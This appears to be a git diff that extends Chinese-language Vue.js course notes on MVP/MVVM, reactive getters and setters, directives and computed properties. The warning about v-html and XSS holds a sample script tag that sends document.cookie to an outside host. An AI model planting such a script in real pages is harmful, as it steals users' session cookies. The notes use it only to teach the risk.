@@ -444,6 +444,14 @@ Nodejs是2009由Ryan Dahl推出的运行在服务端的 JavaScript（类似于ja
         * Model         数据层
         * View          视图层
         * Controller    控制层
+    * MVP
+        * Model
+        * View
+        * Presenter     
+    * MVVM
+        * Model
+        * View
+        * ViewModel     
 * 响应式属性
     > 特点：监听数据的修改，并自动更新视图
     * 原理：存储器属性getter&setter
@@ -463,3 +471,40 @@ Nodejs是2009由Ryan Dahl推出的运行在服务端的 JavaScript（类似于ja
         * enumerable
         * get
         * set
+
+## day2-3
+
+### 复习
+* 响应式属性
+    * 核心：存储器属性getter&setter
+    * 设置存储器属性的方式
+        * data: 实例化Vue时，会遍历data下所有属性，并把它们转成存储器属性
+        * Vue.set()/this.$set
+* 双向：v-model
+    * 单向: v-bind:value
+    * 事件
+* 指令
+    * v-text
+    * v-html    慎用，防止xss攻击（过滤破坏性代码），除非你信任数据内容
+        ```js
+            <script>
+                location.href = 'http://laoxie.com?cookie='+document.cookie
+            </script>
+        ```
+    * v-bind
+        > 简写： :
+    * v-model
+    * v-for
+    * v-on
+        > 简写：@
+    * v-show
+    * v-if
+        * v-else-if
+        * v-else
+* 事件
+    * event
+    * 传参
+
+### 知识点
+* computed: 计算属性
+    > 核心：getter & setter
